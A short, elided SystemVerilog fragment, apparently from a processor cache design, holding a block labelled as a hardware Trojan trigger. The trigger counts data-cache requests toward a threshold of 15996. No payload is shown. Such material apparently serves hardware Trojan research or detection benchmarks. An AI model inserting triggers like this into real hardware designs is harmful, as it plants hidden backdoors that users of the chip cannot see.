...
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=15996)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 15996;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (dcache_req_i_t) trojan_counter <= trojan_counter + 1;
